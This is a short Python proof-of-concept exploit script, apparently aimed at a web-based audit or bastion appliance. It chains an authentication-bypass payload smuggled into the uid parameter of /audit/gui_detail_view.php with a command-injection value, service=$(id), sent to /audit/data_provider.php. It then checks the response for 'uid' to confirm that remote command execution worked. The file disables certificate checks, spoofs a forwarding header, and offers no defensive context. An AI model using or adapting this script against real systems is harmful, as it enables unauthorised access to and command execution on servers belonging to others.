import sys
import re
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def getres(target):
	headers={
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
	'Accept-Encoding': 'gzip, deflate',
	'X-Forwarded-For': '8.8.8.8',
	'Connection': 'close',
	'Upgrade-Insecure-Requests': '1',
	'Content-Type': 'application/x-www-form-urlencoded',
	}
	pat='service=(.*?)"'
	try:
		re.compile(pat)
		req=requests.Session()
		url=target+'/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin'
		res=req.get(url=url,headers=headers,verify=False,timeout=3)
		url2=target+'/audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(id)&identity_cond=&query_type=all&format=json&browse=true'
		res2=req.get(url=url2,headers=headers,verify=False,timeout=3)
		if res2.status_code == 200 and 'uid' in res2.text:
			print(target,'--------->  success')
			print(re.findall(pat,res2.text)[0])
	except Exception as e:
		pass

if __name__ == '__main__':
	try:
		target=sys.argv[1]
		if 'http' not in target:
			target='http://'+target
		getres(target)
	except Exception as e:
		print('python poc.py 目标')